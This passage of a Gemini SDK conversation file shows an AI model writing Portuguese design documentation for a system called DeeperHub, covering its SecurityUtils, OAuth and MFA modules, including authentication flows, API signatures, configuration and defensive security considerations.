*   **Fonte de Aleatoriedade:** Sempre usar `:crypto.strong_rand_bytes/1` para gerar material aleat√≥rio para tokens, chaves, salts, etc. N√£o usar geradores de n√∫meros pseudoaleat√≥rios n√£o seguros (ex: `:rand`).
*   **Hashing de Senhas:** Se implementado aqui, seguir as melhores pr√°ticas: algoritmo forte (Argon2id √© o recomendado atualmente), salt √∫nico por senha, n√∫mero de itera√ß√µes/custo adequadamente alto.
*   **Segredos e Chaves:** Este m√≥dulo *gera* chaves ou tokens, mas n√£o √© respons√°vel por seu armazenamento seguro. O chamador √© respons√°vel por isso.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Novas fun√ß√µes de utilidade de seguran√ßa devem ser revisadas cuidadosamente quanto √† sua corre√ß√£o criptogr√°fica e potenciais vulnerabilidades.
*   Prefira usar as primitivas do `:crypto` sempre que poss√≠vel.
*   Mantenha a documenta√ß√£o clara sobre o prop√≥sito e as garantias de seguran√ßa de cada fun√ß√£o.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Adicionar utilit√°rios para criptografia/descriptografia sim√©trica simples com uma chave fornecida (se `Core.EncryptionService` for considerado muito pesado para alguns casos de uso internos e menos cr√≠ticos). *Cuidado aqui, pois pode levar √† prolifera√ß√£o de gerenciamento de chaves ad-hoc.*
*   [ ] Fornecer wrappers para opera√ß√µes comuns do `:public_key` se criptografia assim√©trica for necess√°ria em algum utilit√°rio.
*   [ ] Avaliar a necessidade de fun√ß√µes de \"key derivation\" (KDF) gen√©ricas, al√©m do que √© usado implicitamente no hashing de senhas.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Com `SecurityUtils`, completamos a vis√£o geral dos principais m√≥dulos em `DeeperHub.Shared.Utils`.

Agora temos uma base s√≥lida de m√≥dulos Core, de Seguran√ßa e Utilit√°rios. Onde gostaria de ir a seguir? Podemos come√ßar a detalhar um dos m√≥dulos de dom√≠nio mais complexos como `DeeperHub.OAuth` ou `DeeperHub.MFA`, ou talvez o `DeeperHub.Webhooks`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Entendido! Vamos ent√£o para um dos m√≥dulos de dom√≠nio/autentica√ß√£o mais complexos e interativos: `DeeperHub.OAuth`. Este m√≥dulo lida com a integra√ß√£o com provedores de autentica√ß√£o externos como Google, Facebook, GitHub, etc.

---

# M√≥dulo: `DeeperHub.OAuth` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.OAuth`

O m√≥dulo `DeeperHub.OAuth` √© respons√°vel por gerenciar a **autentica√ß√£o e autoriza√ß√£o de usu√°rios atrav√©s de provedores OAuth 2.0 externos** (como Google, Facebook, GitHub, Apple, etc.). Ele permite que os usu√°rios do DeeperHub fa√ßam login ou registrem-se usando suas contas existentes nesses provedores, al√©m de permitir que o DeeperHub (com consentimento do usu√°rio) acesse certos dados ou execute a√ß√µes em nome do usu√°rio nesses servi√ßos externos.

As principais funcionalidades incluem:
1.  Iniciar o fluxo de autoriza√ß√£o OAuth com o provedor.
2.  Processar o callback do provedor ap√≥s a autoriza√ß√£o do usu√°rio.
3.  Trocar o c√≥digo de autoriza√ß√£o por tokens de acesso e refresh.
4.  Buscar informa√ß√µes do perfil do usu√°rio do provedor.
5.  Vincular contas OAuth a contas DeeperHub existentes ou criar novas contas.
6.  Gerenciar (armazenar, atualizar, revogar) os tokens OAuth obtidos.

Este m√≥dulo simplifica a integra√ß√£o com m√∫ltiplos provedores OAuth, oferecendo uma interface unificada para o restante da aplica√ß√£o. üòä

*(Nota: A documenta√ß√£o original tem `DeeperHub.OAuth.Adapters.OAuthAdapterUnified`, `Behaviours.OAuthBehaviourUnified`, `Cache.UserInfoCache`, `Integrations.EventIntegration`, `Integrations.OAuthApiIntegration`, `OAuthCompatibility`, `OAuthFacadeUnified`, `Schema.OAuthToken`, e v√°rios `Services`. Esta documenta√ß√£o tentar√° consolidar e organizar essas responsabilidades.)*

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **In√≠cio do Fluxo OAuth (`authorize_url/3`):**
    *   Gerar a URL de autoriza√ß√£o correta para um provedor espec√≠fico, incluindo `client_id`, `redirect_uri`, `scope`, `state`, e outros par√¢metros necess√°rios.
*   **Processamento de Callback (`process_oauth_callback/4` ou `authenticate_with_code/3`):**
    *   Receber e validar o c√≥digo de autoriza√ß√£o e o par√¢metro `state` do provedor.
    *   Trocar o c√≥digo de autoriza√ß√£o por um token de acesso e, opcionalmente, um token de refresh (`exchange_code/3`).
*   **Obten√ß√£o de Informa√ß√µes do Usu√°rio (`get_user_info/2`):**
    *   Usar o token de acesso para buscar informa√ß√µes do perfil do usu√°rio do endpoint de userinfo do provedor.
*   **Gerenciamento de Contas DeeperHub:**
    *   Encontrar um usu√°rio DeeperHub existente com base no email ou ID do provedor.
    *   Criar uma nova conta DeeperHub se o usu√°rio n√£o existir e o auto-registro via OAuth estiver habilitado.
    *   Vincular a identidade OAuth a uma conta DeeperHub existente (`link_account/4`).
    *   Desvincular uma conta OAuth (`unlink_account/2`).
*   **Gerenciamento de Tokens OAuth (`DeeperHub.OAuth.Schema.OAuthToken`):**
    *   Armazenar de forma segura os tokens de acesso e refresh obtidos dos provedores.
    *   Atualizar tokens de acesso usando tokens de refresh.
    *   Lidar com a revoga√ß√£o de tokens.
*   **Abstra√ß√£o de Provedores:**
    *   Suportar m√∫ltiplos provedores OAuth com configura√ß√µes e fluxos espec√≠ficos para cada um.
    *   Utilizar adaptadores por provedor ou uma biblioteca OAuth gen√©rica (como `Assent`).
*   **Cache de Informa√ß√µes do Usu√°rio (`Cache.UserInfoCache`):**
    *   Cachear informa√ß√µes do perfil do usu√°rio obtidas dos provedores para reduzir chamadas de API.
*   **Seguran√ßa:**
    *   Uso do par√¢metro `state` para prevenir ataques CSRF durante o fluxo OAuth.
    *   Valida√ß√£o rigorosa de `redirect_uri`.
    *   Armazenamento seguro de `client_secret` e tokens.
*   **Integra√ß√£o com `DeeperHub.Auth` e `DeeperHub.Accounts`:**
    *   Ap√≥s a autentica√ß√£o OAuth bem-sucedida, criar uma sess√£o DeeperHub e emitir tokens DeeperHub.
*   **Observabilidade e Auditoria:**
    *   Logar etapas do fluxo OAuth e quaisquer erros.
    *   Registrar m√©tricas sobre autentica√ß√µes OAuth.
    *   Auditar vincula√ß√£o e desvincula√ß√£o de contas.
*   **Prote√ß√£o com Circuit Breaker (`Integrations.OAuthApiIntegration`):**
    *   Proteger chamadas para os endpoints dos provedores OAuth (token, userinfo) usando circuit breakers.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.OAuth` (Fachada P√∫blica, ex-`OAuthFacadeUnified`):**
    *   Ponto de entrada para todas as opera√ß√µes OAuth.
    *   Delega para o `OAuthService`.
2.  **`DeeperHub.OAuth.Services.OAuthService` (ou `DefaultOAuthService`):**
    *   **Responsabilidade:** Orquestra o fluxo OAuth completo.
    *   **Intera√ß√µes:**
        *   `ProviderService` (ou adaptadores de provedor): Para obter URLs de autoriza√ß√£o e trocar c√≥digos por tokens.
        *   `CallbackService`: Para processar o callback, buscar informa√ß√µes do usu√°rio e lidar com a conta DeeperHub.
        *   `DeeperHub.OAuth.Schema.OAuthToken` (via `Core.Repo`): Para armazenar e gerenciar tokens OAuth.
        *   `DeeperHub.Accounts`: Para encontrar/criar usu√°rios DeeperHub.
        *   `DeeperHub.Auth.SessionManager` e `TokenService`: Para criar sess√µes DeeperHub ap√≥s autentica√ß√£o.
        *   `Cache.UserInfoCache`: Para cachear perfis de usu√°rio OAuth.
        *   `Integrations.OAuthApiIntegration`: Para fazer chamadas HTTP seguras aos provedores.
3.  **`DeeperHub.OAuth.Services.ProviderService` (ou Adaptadores por Provedor):**
    *   **Responsabilidade:** Encapsular a l√≥gica espec√≠fica de cada provedor OAuth (endpoints, escopos padr√£o, formato de dados do usu√°rio).
    *   Pode usar uma biblioteca como `Assent` internamente ou implementar chamadas HTTP diretas (protegidas por `OAuthApiIntegration`).
4.  **`DeeperHub.OAuth.Services.CallbackService`:**
    *   **Responsabilidade:** L√≥gica espec√≠fica para o manuseio do callback do provedor, incluindo valida√ß√£o de `state`, troca de c√≥digo, e concilia√ß√£o com contas DeeperHub.
5.  **`DeeperHub.OAuth.Integrations.OAuthApiIntegration`:**
    *   Utiliza `DeeperHub.Core.CircuitBreaker` e `Core.HTTPClient` para fazer chamadas seguras aos endpoints dos provedores.
6.  **`DeeperHub.OAuth.Cache.UserInfoCache` (GenServer/ETS):**
    *   Armazena temporariamente os perfis de usu√°rio obtidos dos provedores.
7.  **`DeeperHub.OAuth.Schema.OAuthToken` (Ecto Schema):**
    *   Armazena `user_id` (DeeperHub), `provider` (ex: \"google\"), `provider_user_id`, `access_token` (criptografado), `refresh_token` (criptografado), `expires_at`, `scopes`.
8.  **Configura√ß√µes (via `DeeperHub.Core.ConfigManager`):**
    *   `client_id`, `client_secret`, `redirect_uri`, escopos padr√£o, URLs de endpoint para cada provedor OAuth configurado.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/oauth/
‚îú‚îÄ‚îÄ oauth.ex                          # Fachada P√∫blica (ex-OAuthFacadeUnified)
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îú‚îÄ‚îÄ oauth_service.ex              # Servi√ßo orquestrador principal
‚îÇ   ‚îú‚îÄ‚îÄ provider_service.ex           # L√≥gica/adaptadores para interagir com provedores
‚îÇ   ‚îî‚îÄ‚îÄ callback_service.ex           # L√≥gica para processar callbacks
‚îÇ
‚îú‚îÄ‚îÄ integrations/
‚îÇ   ‚îú‚îÄ‚îÄ event_integration.ex
‚îÇ   ‚îú‚îÄ‚îÄ audit_integration.ex          # (Se necess√°rio, logar vincula√ß√µes/desvincula√ß√µes)
‚îÇ   ‚îî‚îÄ‚îÄ oauth_api_integration.ex      # Chamadas HTTP com Circuit Breaker
‚îÇ
‚îú‚îÄ‚îÄ cache/
‚îÇ   ‚îî‚îÄ‚îÄ user_info_cache.ex
‚îÇ
‚îú‚îÄ‚îÄ schemas/                          # (Ou schema/)
‚îÇ   ‚îî‚îÄ‚îÄ oauth_token.ex
‚îÇ
‚îú‚îÄ‚îÄ supervisor.ex
‚îî‚îÄ‚îÄ telemetry.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Abstra√ß√£o de Provedor:** O `ProviderService` ou o uso de uma biblioteca como `Assent` √© crucial para adicionar novos provedores facilmente.
*   **Seguran√ßa do `state`:** O par√¢metro `state` deve ser gerado, armazenado temporariamente (ex: na sess√£o do usu√°rio ou em um cache de curta dura√ß√£o com ID na sess√£o) e validado no callback para prevenir CSRF.
*   **Armazenamento Seguro de Tokens:** `client_secret`s e `refresh_token`s/`access_token`s de usu√°rio devem ser armazenados de forma criptografada em repouso (`Core.EncryptionService`).
*   **Fluxo de Vincula√ß√£o de Conta:** Definir claramente como uma identidade OAuth √© vinculada a uma conta DeeperHub nova ou existente (ex: por correspond√™ncia de email verificado, ou permitindo que o usu√°rio escolha).
*   **Gerenciamento de Escopos:** Lidar corretamente com os escopos solicitados e concedidos.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Usu√°rio Novo Registra-se com Google:**
    1.  Usu√°rio clica em \"Registrar com Google\".
    2.  Frontend chama `GET /api/oauth/google/authorize_url`.
    3.  `OAuth.authorize_url(:google, ...)` gera a URL do Google.
    4.  Usu√°rio √© redirecionado para o Google, autoriza.
    5.  Google redireciona para `/api/oauth/google/callback?code=...&state=...`.
    6.  `OAuth.authenticate_with_code(:google, code, state, context)` √© chamado.
    7.  Tokens s√£o trocados, perfil do Google √© buscado.
    8.  Como o usu√°rio √© novo, uma conta DeeperHub √© criada, vinculada √† identidade Google.
    9.  Uma sess√£o DeeperHub √© criada, tokens DeeperHub s√£o retornados.
*   **Usu√°rio Existente Faz Login com Facebook:**
    *   Fluxo similar, mas no final, a identidade Facebook √© vinculada a uma conta DeeperHub existente (ex: pelo email).
*   **Usu√°rio Existente Vincula uma Nova Conta GitHub ao seu Perfil DeeperHub:**
    *   Usu√°rio j√° logado no DeeperHub vai para \"Contas Vinculadas\".
    *   Clica em \"Vincular GitHub\".
    *   Fluxo OAuth similar, mas no final, a identidade GitHub √© apenas adicionada ao `user_id` DeeperHub existente.

## üåä 5. Fluxos Importantes

### Fluxo Completo de Autentica√ß√£o OAuth 2.0 (Authorization Code Grant)

1.  **In√≠cio (Cliente DeeperHub -> Fachada OAuth):**
    *   O cliente (ex: frontend DeeperHub) solicita a URL de autoriza√ß√£o para um provedor (ex: Google).
    *   `DeeperHub.OAuth.authorize_url(:google, configured_redirect_uri, generate_and_store_state_param())`.
    *   O `state` √© gerado, armazenado na sess√£o do usu√°rio ou cache com TTL curto, e inclu√≠do na URL.
    *   A URL do Google √© retornada ao cliente.
2.  **Redirecionamento para o Provedor:**
    *   O navegador do usu√°rio √© redirecionado para a URL do Google.
3.  **Autoriza√ß√£o pelo Usu√°rio (no site do Provedor):**
    *   O usu√°rio faz login no Google (se necess√°rio) e concede as permiss√µes solicitadas pelo DeeperHub.
4.  **Redirecionamento de Volta para DeeperHub (Callback):**
    *   Google redireciona o navegador do usu√°rio para a `redirect_uri` configurada no DeeperHub, incluindo um `code` (c√≥digo de autoriza√ß√£o) e o `state` original.
    *   Ex: `https://app.deeperhub.com/oauth/google/callback?code=AUTH_CODE_FROM_GOOGLE&state=STORED_STATE`.
5.  **Processamento do Callback (Controller API -> Fachada OAuth):**
    *   O controller do DeeperHub recebe o `code` e `state`.
    *   Chama `DeeperHub.OAuth.authenticate_with_code(:google, code, state, %{ip_address: ..., user_agent: ...})`.
6.  **`DeeperHub.OAuth.Services.OAuthService` e `CallbackService`:**
    *   **Valida√ß√£o do `state`:** Compara o `state` recebido com o armazenado na Etapa 1. Se diferente, aborta (CSRF).
    *   **Troca de C√≥digo por Tokens:** Chama `ProviderService` (ou `OAuthApiIntegration`) para enviar o `code` para o endpoint de token do Google (com `client_id`, `client_secret`, `redirect_uri`).
        *   `OAuthApiIntegration` faz a chamada HTTP POST protegida por Circuit Breaker.
    *   **Recebimento de Tokens:** Recebe `access_token`, `refresh_token` (se aplic√°vel), `expires_in` do Google.
    *   **Busca de Informa√ß√µes do Usu√°rio:** Chama `ProviderService` (ou `OAuthApiIntegration`) para usar o `access_token` e buscar o perfil do usu√°rio do endpoint userinfo do Google.
        *   Perfil √© cacheado no `UserInfoCache`.
    *   **Concilia√ß√£o de Conta:**
        *   Tenta encontrar um usu√°rio DeeperHub existente pelo `provider_user_id` (ex: Google ID) ou pelo email verificado do perfil Google.
        *   Se encontrado, vincula a identidade OAuth (se ainda n√£o vinculada) ou atualiza os tokens OAuth.
        *   Se n√£o encontrado, e auto-registro habilitado, cria uma nova conta DeeperHub e vincula a identidade OAuth.
        *   Armazena/Atualiza os tokens OAuth no `OAuthTokenSchema` (criptografados).
    *   **Cria√ß√£o de Sess√£o DeeperHub:** Se a concilia√ß√£o for bem-sucedida (usu√°rio DeeperHub identificado/criado):
        *   Chama `DeeperHub.Auth.SessionManager.create_session(...)`.
        *   Chama `DeeperHub.Auth.TokenService.generate_token_pair(...)`.
    *   Publica eventos (`account_linked`, `authentication_succeeded`) via `EventIntegration`.
    *   Audita a opera√ß√£o.
7.  **Resposta ao Cliente:** Retorna os tokens DeeperHub e informa√ß√µes do usu√°rio para o frontend, que completa o login.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.OAuth`)

*(Baseado na documenta√ß√£o original de `OAuthFacadeUnified` e `OAuthCompatibility`)*

### 6.1. `DeeperHub.OAuth.authorize_url(provider :: atom(), redirect_uri_key :: atom() | String.t(), session_state_data :: map()) :: {:ok, %{authorize_url: String.t(), state_param_for_session: String.t()}} | {:error, term()}`

*   **Descri√ß√£o:** Gera a URL de autoriza√ß√£o para o `provider` e um `state` para prote√ß√£o CSRF.
*   **`redirect_uri_key`:** Uma chave que mapeia para uma `redirect_uri` configurada (para evitar que o cliente envie URIs arbitr√°rias).
*   **`session_state_data`:** Dados a serem inclu√≠dos no `state` ou associados a ele na sess√£o.
*   **Retorno:** URL para redirecionamento e o `state` que o cliente deve armazenar (ex: em cookie de sess√£o) para verificar no callback.

### 6.2. `DeeperHub.OAuth.authenticate_with_code(provider :: atom(), code :: String.t(), received_state :: String.t(), context :: map()) :: {:ok, AuthResponse.t()} | {:error, OAuthError.t()}`

*   **Descri√ß√£o:** Processa o callback do provedor OAuth, troca o c√≥digo por tokens, busca info do usu√°rio e autentica/registra o usu√°rio no DeeperHub.
*   **`context`:** `%{ip_address: String.t(), user_agent: String.t(), expected_state_from_session: String.t()}`.
*   **`AuthResponse.t()`:** `%{user: DeeperHub.Accounts.Schema.User.t(), deeper_hub_access_token: String.t(), deeper_hub_refresh_token: String.t(), provider_info: %{provider: atom(), provider_user_id: String.t()}}`.
*   **`OAuthError.t()`:** Ex: `:invalid_state`, `:token_exchange_failed`, `:user_info_fetch_failed`, `:account_linking_failed`, `:user_creation_disabled`.

### 6.3. `DeeperHub.OAuth.link_account(deeper_hub_user_id :: String.t(), provider :: atom(), provider_code :: String.t(), received_state :: String.t(), context :: map()) :: {:ok, OAuthToken.t()} | {:error, OAuthError.t()}` (Nova Sugest√£o)

*   **Descri√ß√£o:** Permite que um usu√°rio j√° logado no DeeperHub vincule uma nova conta OAuth. O fluxo √© similar ao `authenticate_with_code` mas focado em vincular a uma conta existente.

### 6.4. `DeeperHub.OAuth.unlink_account(deeper_hub_user_id :: String.t(), provider :: atom()) :: :ok | {:error, :not_linked | term()}`

*   **Descri√ß√£o:** Desvincula uma conta OAuth de um usu√°rio DeeperHub.

### 6.5. `DeeperHub.OAuth.list_linked_accounts(deeper_hub_user_id :: String.t()) :: {:ok, list(LinkedAccountInfo.t())}`

*   **Descri√ß√£o:** Lista as contas OAuth vinculadas a um usu√°rio DeeperHub.
*   **`LinkedAccountInfo.t()`:** `%{provider: atom(), provider_user_id: String.t(), provider_email: String.t() | nil, linked_at: DateTime.t()}`.

### 6.6. `DeeperHub.OAuth.get_user_info_from_provider(provider :: atom(), access_token :: String.t()) :: {:ok, ProviderUserProfile.t()} | {:error, term()}` (Para uso interno ou admin)

*   **Descri√ß√£o:** Busca informa√ß√µes do usu√°rio diretamente do provedor usando um token de acesso OAuth v√°lido.
*   **`ProviderUserProfile.t()`:** Mapa com dados do perfil do provedor.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager`:

*   **`[:oauth, :enabled_providers]`** (List de Atoms): Lista de provedores OAuth habilitados (ex: `[:google, :facebook, :github]`).
*   **Para cada provedor (ex: `[:oauth, :google, ...]`):**
    *   `... :client_id` (String)
    *   `... :client_secret` (String, DEVE ser de vari√°vel de ambiente ou cofre)
    *   `... :redirect_uris` (Map, ex: `%{default: \"https://app.deeperhub.com/oauth/google/callback\", mobile: \"myapp://oauth/google\"}`)
    *   `... :authorize_url` (String)
    *   `... :token_url` (String)
    *   `... :user_info_url` (String)
    *   `... :default_scopes` (List de Strings)
    *   `... :user_id_path` (List de Strings/Atoms): Caminho para extrair o ID do usu√°rio do provedor da resposta userinfo (ex: `[:id]`).
    *   `... :user_email_path` (List de Strings/Atoms): Caminho para o email.
    *   `... :user_name_path` (List de Strings/Atoms): Caminho para o nome.
*   **`[:oauth, :auto_register_new_users]`** (Boolean): Se deve criar automaticamente contas DeeperHub para novos usu√°rios OAuth. (Padr√£o: `true`)
*   **`[:oauth, :link_by_verified_email]`** (Boolean): Se deve tentar vincular automaticamente a uma conta DeeperHub existente se o email do provedor OAuth for verificado e corresponder. (Padr√£o: `true`)
*   **`[:oauth, :state_param_ttl_seconds]`** (Integer): TTL para o par√¢metro `state` armazenado na sess√£o. (Padr√£o: `300`)
*   **`[:oauth, :user_info_cache_ttl_seconds]`** (Integer): TTL para o cache de perfis de usu√°rio OAuth. (Padr√£o: `3600`)
*   **`[:oauth, :api_integration, :circuit_breaker, <provider_name>]`** (Map): Configs do Circuit Breaker para cada provedor.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.EventBus`, `Core.Logger`, `Core.Metrics`, `Core.Repo`, `Core.Cache`, `Core.HTTPClient`, `Core.EncryptionService`, `Core.CircuitBreaker`.
*   `DeeperHub.Accounts`: Para criar/encontrar/vincular usu√°rios.
*   `DeeperHub.Auth`: Para criar sess√µes DeeperHub ap√≥s autentica√ß√£o OAuth.
*   `DeeperHub.Audit`: Para registrar eventos de vincula√ß√£o/autentica√ß√£o.

### 8.2. Bibliotecas Externas

*   `Assent` (altamente recomendado): Biblioteca Elixir popular para lidar com m√∫ltiplos provedores OAuth 2.0. Simplifica muito a implementa√ß√£o de `ProviderService`.
*   `Jason`: Para parsear respostas JSON dos provedores.
*   `HTTPoison` ou `Finch` (se n√£o usar `Core.HTTPClient` que os encapsularia): Para fazer chamadas HTTP.

## ü§ù 9. Como Usar / Integra√ß√£o

*   **Frontend/Cliente:**
    1.  Chamar um endpoint da API DeeperHub (ex: `/api/oauth/:provider/authorize`) que internamente chama `OAuth.authorize_url/3`.
    2.  A API DeeperHub retorna a `authorize_url` do provedor.
    3.  Frontend redireciona o usu√°rio para essa URL.
    4.  Ap√≥s o usu√°rio autorizar, o provedor redireciona para a `redirect_uri` do DeeperHub (ex: `/api/oauth/:provider/callback`) com `code` e `state`.
    5.  O controller do callback no DeeperHub chama `OAuth.authenticate_with_code/4`.
    6.  Se bem-sucedido, a API DeeperHub retorna tokens DeeperHub para o frontend, que finaliza o login.
*   **Servi√ßos Internos:** Podem usar `list_linked_accounts` ou `get_user_info_from_provider` (com cuidado e consentimento) para funcionalidades espec√≠ficas.

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar o fluxo completo para cada provedor configurado usando mocks para as APIs dos provedores.
*   Testar a gera√ß√£o da `authorize_url` e a valida√ß√£o do `state`.
*   Testar a troca de c√≥digo por token e a busca de userinfo.
*   Testar os cen√°rios de usu√°rio novo, usu√°rio existente com conta n√£o vinculada, e usu√°rio existente com conta j√° vinculada.
*   Testar a l√≥gica de desvincula√ß√£o.
*   Testar o funcionamento do `UserInfoCache`.
*   Testar o Circuit Breaker para chamadas a APIs de provedores.
*   Localiza√ß√£o: `test/deeper_hub/oauth/`.

### 10.2. M√©tricas

*   `deeper_hub.oauth.authentication.attempts.count` (tags: `provider`, `status` (`success`, `failure`))
*   `deeper_hub.oauth.authentication.duration_ms` (Histograma, tags: `provider`, `stage` (`code_exchange`, `user_info_fetch`))
*   `deeper_hub.oauth.accounts_linked.count` (tags: `provider`)
*   `deeper_hub.oauth.accounts_unlinked.count` (tags: `provider`)
*   `deeper_hub.oauth.user_info_cache.hit_ratio.gauge` (Gauge)
*   `deeper_hub.oauth.api_call.failure.count` (tags: `provider`, `endpoint_type` (`token`, `userinfo`)) (relacionado ao Circuit Breaker)

### 10.3. Logs

*   **N√≠vel INFO:** In√≠cio e fim de um fluxo OAuth. Conta vinculada/desvinculada. Tokens trocados/atualizados.
*   **N√≠vel WARNING:** Falha na valida√ß√£o do `state`. Falha na troca de c√≥digo ou busca de userinfo (antes de retentativas do Circuit Breaker).
*   **N√≠vel ERROR:** Falha persistente na comunica√ß√£o com o provedor OAuth. Erro ao criar/vincular conta DeeperHub ap√≥s autentica√ß√£o OAuth.

### 10.4. Telemetria

*   `[:deeper_hub, :oauth, :authorize_url_generated]`
    *   Metadados: `%{provider: provider, redirect_uri_key: key}`
*   `[:deeper_hub, :oauth, :callback_received]`
    *   Metadados: `%{provider: provider, state_valid: boolean}`
*   `[:deeper_hub, :oauth, :token_exchange, :start | :stop | :exception]`
    *   Metadados: `%{provider: provider}`
*   `[:deeper_hub, :oauth, :user_info_fetch, :start | :stop | :exception]`
    *   Metadados: `%{provider: provider, from_cache: boolean}`
*   `[:deeper_hub, :oauth, :account_reconciliation, :stop]`
    *   Metadados: `%{provider: provider, action_taken: :linked_new | :linked_existing | :created_new_deeper_hub_user | :login_existing}`

## ‚ùå 11. Tratamento de Erros

*   Falhas na comunica√ß√£o com provedores externos devem ser tratadas pelo `OAuthApiIntegration` (com Circuit Breaker), retornando erros claros para o `OAuthService`.
*   O `state` inv√°lido no callback deve resultar em erro e impedir o prosseguimento.
*   Se o email de um usu√°rio OAuth j√° existir em uma conta DeeperHub diferente e a vincula√ß√£o autom√°tica n√£o for clara, o usu√°rio pode precisar ser guiado por um fluxo de \"conflito de contas\".

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Valida√ß√£o do `state`:** Essencial para prevenir CSRF no fluxo OAuth.
*   **Valida√ß√£o de `redirect_uri`:** O DeeperHub deve validar que a `redirect_uri` usada pelo provedor √© uma das URIs pr√©-registradas e permitidas para evitar que c√≥digos de autoriza√ß√£o sejam enviados para endpoints maliciosos.
*   **Armazenamento Seguro de `client_secret`:** Tratar como um segredo de alta import√¢ncia.
*   **Armazenamento Seguro de Tokens de Usu√°rio:** Tokens de acesso e refresh OAuth de usu√°rios devem ser criptografados em repouso.
*   **Escopos M√≠nimos:** Solicitar apenas os escopos estritamente necess√°rios dos provedores OAuth.
*   **Atualiza√ß√£o de Tokens:** Implementar corretamente o fluxo de atualiza√ß√£o de tokens de acesso usando tokens de refresh para evitar que o usu√°rio precise reautorizar frequentemente.
*   **Revoga√ß√£o de Tokens:** Quando um usu√°rio desvincula uma conta ou sua conta DeeperHub √© encerrada, os tokens OAuth associados devem ser revogados no lado do provedor, se a API do provedor permitir.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Ao adicionar um novo provedor OAuth:
    *   Registrar as configura√ß√µes (client_id, secret, endpoints, escopos) no `ConfigManager`.
    *   Adicionar l√≥gica espec√≠fica do provedor no `ProviderService` (ou usar uma estrat√©gia de `Assent`).
    *   Mapear os campos do perfil do usu√°rio do provedor para o formato interno do DeeperHub.
    *   Testar o fluxo completo.
*   Manter as bibliotecas cliente OAuth (como Assent) atualizadas.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar o fluxo de revoga√ß√£o de tokens do lado do provedor quando uma conta √© desvinculada.
*   [ ] Permitir que usu√°rios vejam e gerenciem quais dados e permiss√µes foram concedidos a cada provedor vinculado.
*   [ ] Suporte para OpenID Connect (OIDC) sobre OAuth 2.0 para um fluxo de autentica√ß√£o mais padronizado.
*   [ ] Adicionar um fluxo para lidar com \"account linking conflicts\" de forma mais interativa com o usu√°rio.
*   [ ] Permitir que administradores configurem dinamicamente novos provedores OAuth atrav√©s de uma UI (armazenando client_id/secret de forma segura).

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

OAuth √© um fluxo complexo com muitas partes m√≥veis, mas essencial para a experi√™ncia moderna de login.

O que vem agora? Podemos detalhar o `DeeperHub.MFA` (Autentica√ß√£o Multifator), que √© outra pe√ßa chave do `Auth`, ou talvez o `DeeperHub.Webhooks` para variar um pouco?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""√ìtimo! Vamos prosseguir com o `DeeperHub.MFA` (Autentica√ß√£o Multifator). Este √© um componente de seguran√ßa cada vez mais indispens√°vel para proteger contas de usu√°rio.

---

# M√≥dulo: `DeeperHub.MFA` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.MFA`

O m√≥dulo `DeeperHub.MFA` √© respons√°vel por gerenciar e aplicar a **Autentica√ß√£o Multifator (MFA)**, tamb√©m conhecida como autentica√ß√£o de dois fatores (2FA), para os usu√°rios do sistema DeeperHub. O MFA adiciona uma camada extra de seguran√ßa ao processo de login, exigindo que o usu√°rio forne√ßa duas ou mais formas de verifica√ß√£o de identidade antes de conceder acesso.

Este m√≥dulo suporta diversos m√©todos MFA, como:
*   **TOTP (Time-based One-Time Password):** Usando aplicativos autenticadores como Google Authenticator, Authy, etc.
*   **WebAuthn (FIDO2):** Usando chaves de seguran√ßa f√≠sicas, biometria em dispositivos compat√≠veis (integrado com `DeeperHub.WebAuthn`).
*   **C√≥digos de Recupera√ß√£o:** C√≥digos de uso √∫nico para acesso em caso de perda de outros m√©todos.
*   **Notifica√ß√µes Push (Opcional):** Aprova√ß√£o de login via notifica√ß√£o em um dispositivo m√≥vel registrado.
*   **SMS/Email OTP (Opcional, menos seguro):** Envio de c√≥digos de uso √∫nico por SMS ou email.

O objetivo √© dificultar significativamente o acesso n√£o autorizado a contas, mesmo que a senha principal do usu√°rio seja comprometida. üòä

*(Nota: A documenta√ß√£o original tem `DeeperHub.MFA.Adapters.DefaultMFAService`, `MFAAdapter`, `MFABehaviour`, `Integrations`, `Schema`, `Services` como `TOTPService`, `WebAuthnService` (que delega para `DeeperHub.WebAuthn`), `RecoveryCodeService`, `PushVerificationService`, e `MFAPolicyService`. Esta documenta√ß√£o consolida sob a fachada `DeeperHub.MFA` e organiza os componentes internos.)*

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento de M√©todos MFA por Usu√°rio:**
    *   Permitir que usu√°rios registrem (configurem) m√∫ltiplos m√©todos MFA (`setup_method/3`).
    *   Listar os m√©todos MFA configurados por um usu√°rio (`list_methods/1`).
    *   Permitir que usu√°rios removam m√©todos MFA configurados (`remove_method/3`).
    *   Verificar se um m√©todo espec√≠fico est√° ativo para um usu√°rio (`is_method_active?/2`).
*   **Verifica√ß√£o de C√≥digo/Fator MFA:**
    *   Verificar c√≥digos TOTP (`verify_code/3` para TOTP).
    *   Processar e verificar asser√ß√µes WebAuthn (delegado para `DeeperHub.WebAuthn`).
